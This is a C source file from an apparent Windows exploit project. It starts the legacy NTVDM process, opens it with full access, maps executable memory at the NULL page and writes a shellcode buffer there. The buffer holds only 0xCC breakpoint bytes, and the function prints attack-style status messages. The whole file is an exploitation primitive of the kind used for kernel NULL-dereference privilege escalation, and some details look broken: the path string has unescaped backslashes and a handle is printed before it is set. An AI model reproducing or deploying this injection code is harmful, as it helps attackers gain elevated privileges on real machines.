#pragma warning (disable : 6387)

#include "exploit.h"

int ntdvm_inject_shellcode(PHANDLE ntvdm_handle_out)
{
	char shellcode[4096], unused = 0, *null_page = 0;
	HANDLE h_ntvdm = 0;
	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_information;

	memset(&shellcode, 0xCC, sizeof(shellcode));
	RtlSecureZeroMemory(&startup_info, sizeof(startup_info));
	RtlSecureZeroMemory(&process_information, sizeof(process_information));

	if (!CreateProcessA(0, "\"C:\Windows\System32\ntvdm.exe\"", 0, 0, 1, CREATE_NEW_CONSOLE, 0, 0, &startup_info, &process_information))
	{
		printf("\n[-] Failed to create the NTVDM process. Error: %d (0x%x)", GetLastError(), GetLastError());
		CloseHandle(process_information.hProcess);
		CloseHandle(process_information.hThread);
		unused = getchar();
		return 1;
	}
	printf("\n[+] Created the NTVDM process. Handle Value: 0x%p, Process ID: %d (0x%x)", h_ntvdm, process_information.dwProcessId, process_information.dwProcessId);

	h_ntvdm = OpenProcess(PROCESS_ALL_ACCESS, 0, process_information.dwProcessId);
	if (!h_ntvdm)
	{
		printf("\n[-] Failed to obtain a handle to the NTVDM process. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the NTVDM process. Handle Value: 0x%p", h_ntvdm);

	null_page = VirtualAllocEx(h_ntvdm, 1, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("\n[+] Allocated 4096 bytes of stack memory onto the NULL page. Address: 0x%p", null_page);

	if (!WriteProcessMemory(h_ntvdm, null_page, &shellcode, sizeof(shellcode), 0))
	{
		printf("\n[-] Failed to write shellcode to the NTVDM process' NULL page. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Wrote shellcode to the NTVDM process' NULL page.");

	CloseHandle(process_information.hProcess);
	CloseHandle(process_information.hThread);

	return 0;
}